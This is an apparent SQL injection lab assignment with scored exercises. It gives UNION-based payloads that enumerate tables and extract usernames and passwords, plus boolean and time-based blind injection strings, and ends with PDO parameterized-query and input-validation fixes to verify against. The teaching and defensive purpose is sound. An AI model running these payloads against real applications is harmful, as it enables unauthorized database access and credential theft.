@@ -1,0 +1,82 @@
+ Exercise 2 — Enumeration (30 points)
+
+Step 1: Find Number of Columns
+
+Use ORDER BY or UNION SELECT method:
+
+Payload:
+
+text
+1' ORDER BY 1-- 
+1' ORDER BY 2-- 
+...
+Until you get an error.
+If error at ORDER BY 5, then 4 columns.
+
+Step 2: Use UNION to Extract Data
+
+Payload:
+
+text
+1' UNION SELECT 1,2,3,4-- 
+See which numbers appear in the response (e.g., 2 and 3 might be displayed).
+
+Step 3: Get Database Name
+
+text
+1' UNION SELECT 1,database(),3,4-- 
+Step 4: List Tables
+
+text
+1' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
+Step 5: List Columns of a Table (e.g., users)
+
+text
+1' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- 
+Step 6: Extract Data (e.g., usernames & passwords)
+
+text
+1' UNION SELECT 1,user,password,4 FROM users-- 
+👁️ Exercise 3 — Blind SQL Injection (20 points)
+
+If the app doesn’t show errors or data directly, use blind techniques.
+
+Boolean-Based Example:
+
+Check if the first letter of the database name is d:
+
+Payload:
+
+text
+1' AND SUBSTRING(database(),1,1)='d'-- 
+If true → normal response.
+If false → different response/error.
+Time-Based Example:
+
+text
+1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)-- 
+If true → response delayed by 5 seconds.
+What to Include:
+
+Screenshot of request with time-based payload.
+Show response time difference (use Burp’s Response timer).
+Explanation of why blind SQLi is slower and requires careful automation.
+🛡️ Exercise 4 — Mitigation & Verification (20 points)
+
+Step 1: Implement Parameterized Queries (PHP PDO Example)
+
+php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
+$stmt->execute(['id' => $input_id]);
+$results = $stmt->fetchAll();
+Step 2: Input Validation
+
+Restrict id to integers:
+
+php
+if (!is_numeric($id)) { die("Invalid input"); }
+Step 3: Test Again
+
+Re-run your SQLi payloads.
+Show that they no longer work (e.g., no extra data returned).
+Capture before/after screenshots.
